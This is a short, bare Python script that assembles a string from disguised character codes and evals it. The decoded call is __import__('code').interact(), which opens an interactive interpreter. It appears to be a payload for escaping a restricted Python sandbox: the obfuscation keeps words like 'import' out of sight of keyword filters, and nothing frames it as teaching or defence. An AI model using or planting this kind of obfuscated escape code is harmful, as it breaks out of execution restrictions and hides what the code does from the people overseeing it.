globals().update({chr(0x62):list()})
globals().update({chr(0x62 + 1):str()}) 
b.append(0x5F)      # _
b.append(0x5F)      # _      
b.append(0x69)      # i
b.append(0x6D)      # m
b.append(0x60 + 0x10)   # p
b.append(0x6F)      # o
b.append(0x62 + 0x10)   # r
b.append(0x64 + 0x10)   # t
b.append(0x5F)      # _
b.append(0x5F)      # _
b.append(0x28)      # (
b.append(0x26 + 0x01)   # '
b.append(0x62 + 0x01)   # c
b.append(0x6F)      # o
b.append(0x64)      # d
b.append(0x65)      # e
b.append(0x26 + 0x01)   # '
b.append(0x29)      # )
b.append(0x2E)      # .
b.append(0x69)      # i
b.append(0x6E)      # n
b.append(0x64 + 0x10)   # t
b.append(0x65)      # e
b.append(0x62 + 0x10)   # r
b.append(0x61)      # a
b.append(0x62 + 0x01)   # c 
b.append(0x64 + 0x10)   # t
b.append(0x28)      # (
b.append(0x29)      # )
eval(c.join(chr(x) for x in b))
